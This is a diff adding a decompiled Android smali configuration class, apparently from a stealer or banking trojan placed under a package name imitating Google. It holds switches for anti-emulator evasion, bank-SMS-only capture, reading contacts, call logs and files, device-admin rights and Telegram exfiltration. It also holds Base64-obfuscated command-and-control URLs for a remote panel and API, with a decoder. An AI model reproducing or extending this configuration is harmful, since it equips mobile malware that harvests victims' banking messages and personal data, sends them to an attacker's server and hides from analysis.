@@ -1,0 +1,115 @@
+.class public Lcom/google/xinoshell/utils/Config;
+.super Ljava/lang/Object;
+.source "Config.java"
+
+
+# static fields
+.field public static final ServerApiUrl:Ljava/lang/String;
+
+.field public static final TgConnectionToken:Ljava/lang/String;
+
+.field public static final TgConnectionUser:Ljava/lang/String;
+
+.field public static final WsServerUrl:Ljava/lang/String;
+
+.field public static final isAntiEmulator:Z = true
+
+.field public static final isBankMessageOnly:Z = true
+
+.field public static final isReadCallLogs:Z = false
+
+.field public static final isReadContact:Z = false
+
+.field public static final sendConnectionToTG:Z = false
+
+.field public static final isAccessAllFiles:Z = false
+
+.field public static final isAccessGallery:Z = false
+
+.field public static final isAccessHiddenFolders:Z = false
+
+.field public static final isDeviceAdmin:Z = false
+
+.field public static final userID:Ljava/lang/String;
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 2
+
+    .line 6
+    const-string v0, "NmEyNTc4YzVhNTdkNDY0YjMwYWJkZTVl"
+
+    invoke-static {v0}, Lcom/google/xinoshell/utils/Config;->decode(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    sput-object v0, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;
+
+    .line 7
+    const-string v0, "d3NzOi8vcGFuZWwuZmxhcmUtbGFicy50ZWNoLw=="
+
+    invoke-static {v0}, Lcom/google/xinoshell/utils/Config;->decode(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    sput-object v0, Lcom/google/xinoshell/utils/Config;->WsServerUrl:Ljava/lang/String;
+
+    .line 8
+    const-string v0, "aHR0cHM6Ly9wYW5lbC5mbGFyZS1sYWJzLnRlY2gvYXBp"
+
+    invoke-static {v0}, Lcom/google/xinoshell/utils/Config;->decode(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    sput-object v0, Lcom/google/xinoshell/utils/Config;->ServerApiUrl:Ljava/lang/String;
+
+    .line 15
+    const-string v0, ""
+
+    invoke-static {v0}, Lcom/google/xinoshell/utils/Config;->decode(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    sput-object v1, Lcom/google/xinoshell/utils/Config;->TgConnectionToken:Ljava/lang/String;
+
+    .line 16
+    const-string v0, ""
+
+    invoke-static {v0}, Lcom/google/xinoshell/utils/Config;->decode(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    sput-object v0, Lcom/google/xinoshell/utils/Config;->TgConnectionUser:Ljava/lang/String;
+
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+
+    .line 5
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+.method private static decode(Ljava/lang/String;)Ljava/lang/String;
+    .locals 2
+    .param p0, "encodedValue"    # Ljava/lang/String;
+
+    .line 19
+    new-instance v0, Ljava/lang/String;
+
+    invoke-static {}, Ljava/util/Base64;->getDecoder()Ljava/util/Base64$Decoder;
+
+    move-result-object v1
+
+    invoke-virtual {v1, p0}, Ljava/util/Base64$Decoder;->decode(Ljava/lang/String;)[B
+
+    move-result-object v1
+
+    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V
+
+    return-object v0
+.end method
